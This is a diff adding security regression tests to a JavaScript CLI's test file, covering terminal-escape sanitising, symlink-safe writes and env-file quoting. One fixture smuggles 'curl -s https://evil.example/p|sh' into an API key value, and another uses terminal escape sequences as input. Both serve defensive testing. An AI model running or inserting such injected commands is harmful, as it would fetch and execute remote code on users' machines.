@@ -80,3 +80,43 @@ test('featureIdOf handles object and bare-id shapes', async () => {
   assert.equal(featureIdOf({ feature: { id: 5, name: 'x' } }), 5);
   assert.equal(featureIdOf({ feature: 7 }), 7);
 });
+
+// ── security fixes (Claude Security scan, Nov 2026) ──
+import { clean, hasControl } from '../src/sanitize.js';
+
+test('clean() makes terminal escape sequences visible and inert', () => {
+  const evil = 'ok\u001b[3A\r\u001b[K fake\u0007\u009b';
+  const out = clean(evil);
+  assert.equal(hasControl(out), false);
+  assert.match(out, /\\x1b\[3A\\x0d\\x1b\[K fake\\x07\\x9b/);
+  assert.equal(clean('plain text'), 'plain text');
+});
+
+test('writeSecure refuses to write through a planted symlink', async () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'fk-'));
+  const victim = path.join(dir, 'victim');
+  fs.writeFileSync(victim, 'keep me');
+  fs.symlinkSync(victim, path.join(dir, 'flagsmith.env'));
+  const { writeSecure } = await import('../src/config.js');
+  assert.throws(() => writeSecure(path.join(dir, 'flagsmith.env'), 'x'), /symbolic link/);
+  assert.equal(fs.readFileSync(victim, 'utf8'), 'keep me');
+});
+
+test('writeEnvFile refuses shell metacharacters from the server and quotes values', async () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'fk-'));
+  const cwd = process.cwd();
+  process.chdir(dir);
+  try {
+    const cfg = await import(`../src/config.js?${Date.now()}`);
+    const base = {
+      apiUrl: 'http://localhost:8000', masterKey: 'abc.DEF123', admin: { email: 'admin@flagkit.local', password: 'Pass_word-123' },
+      project: { id: 1 }, environments: [{ name: 'Development', api_key: 'EnvKey123' }],
+    };
+    cfg.writeEnvFile(base);
+    const txt = fs.readFileSync(path.join(dir, 'flagsmith.env'), 'utf8');
+    assert.match(txt, /export FLAGSMITH_ENVIRONMENT='EnvKey123'/);
+    const evil = structuredClone(base);
+    evil.environments[0].api_key = 'abc\ncurl -s https://evil.example/p|sh';
+    assert.throws(() => cfg.writeEnvFile(evil), /unexpected characters/);
+  } finally { process.chdir(cwd); }
+});
